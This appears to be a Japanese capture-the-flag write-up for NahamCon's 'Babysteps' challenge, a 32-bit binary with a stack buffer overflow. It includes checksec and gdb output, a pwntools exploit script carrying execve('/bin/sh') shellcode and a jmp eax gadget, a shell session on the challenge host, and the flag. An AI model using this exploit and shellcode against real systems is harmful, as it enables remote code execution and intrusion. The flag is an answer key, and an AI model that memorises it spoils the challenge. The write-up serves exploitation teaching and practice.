# Babysteps:Binary Exploitation:385pts
Become a baby! Take your first steps and jump around with BABY SIMULATOR 9000!  

**Connect with:**  
```
nc challenge.nahamcon.com 30149
```

**Attachments:** [babysteps](babysteps)　[babysteps.c](babysteps.c)  

# Solution
接続先、バイナリ、ソースが渡される。  
ソースを読むと`ask_baby_name`に自明なBOFがある。  
次にバイナリを調査すると以下のようであった。  
```bash
$ file babysteps
babysteps: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=23b7b1945e8ce3847c586e16d9ccfb70fe7b6973, for GNU/Linux 3.2.0, not stripped
$ checksec babysteps
[*] '/babysteps'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```
32bitのELFで、主要なセキュリティ機構がOFFのようだ。  
しかしsystemなどはないため、シェルコードを流し込んでやることを考える。  
その際に`jmp esp`(`ff e4`)を探さなければならない。  
objdumpで探しておく。  
```bash
$ objdump -D babysteps > objdump.txt
$ grep 'ff e4' objdump.txt
```
ないため、代替案を探さなければならい。  
```bash
$ grep 'ff e' objdump.txt
 8049545:       ff e0                   jmp    *%eax
```
`jmp eax`はあるようだ。  
ここでeaxに、入力した文字列へのアドレスが格納されていたことを思い出す。  
```bash
$ gdb ./babysteps
~~~
gdb-peda$ b ask_baby_name
Breakpoint 1 at 0x804929d
gdb-peda$ r
~~~
gdb-peda$ c
Continuing.
First, what is your baby name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd1f0 ('A' <repeats 28 times>, "BBBB")
EBX: 0x41414141 ('AAAA')
ECX: 0xf7faf580 --> 0xfbad208b
EDX: 0xffffd210 --> 0x0
ESI: 0xf7faf000 --> 0x1e7d6c
EDI: 0xf7faf000 --> 0x1e7d6c
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd210 --> 0x0
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
~~~
```
入力文字にシェルコードを含めてやればよい。  
シェルコードは[shellcode](https://inaz2.hatenablog.com/entry/2014/03/13/013056)を用いる。  
以下のexploit.pyで行う。  
```python
from pwn import *

elf = ELF("./babysteps")
io = remote("challenge.nahamcon.com", 30149)
#io = process(elf.path)
rop = ROP(elf)

# ref. https://inaz2.hatenablog.com/entry/2014/03/13/013056
shellcode = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

jmp_eax = 0x8049545

base = b"\x90" * 28
payload = base + p32(jmp_eax) + shellcode

io.sendline(payload)
io.interactive()
```
実行する。  
```bash
$ python exploit.py
[*] '/babysteps'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Opening connection to challenge.nahamcon.com on port 30149: Done
[*] Loaded 10 cached gadgets for './babysteps'
[*] Switching to interactive mode
              _)_
           .-'(/ '-.
          /    `    \
         /  -     -  \
        (`  a     a  `)
         \     ^     /
          '. '---' .'
          .-`'---'`-.
         /           \
        /  / '   ' \  \
      _/  /|       |\  \_
     `/|\` |+++++++|`/|\`
          /\       /\
          | `-._.-` |
          \   / \   /
          |_ |   | _|
          | _|   |_ |
          (ooO   Ooo)

=== BABY SIMULATOR 9000 ===
How's it going, babies!!
Are you ready for the adventure of a lifetime? (literally?)

First, what is your baby name?
$ ls
babysteps
bin
dev
etc
flag.txt
lib
lib32
lib64
libx32
usr
$ cat flag.txt
flag{7d4ce4594f7511f8d7d6d0b1edd1a162}
```
シェルが得られ、flagがファイルに書かれていた。  

## flag{7d4ce4594f7511f8d7d6d0b1edd1a162}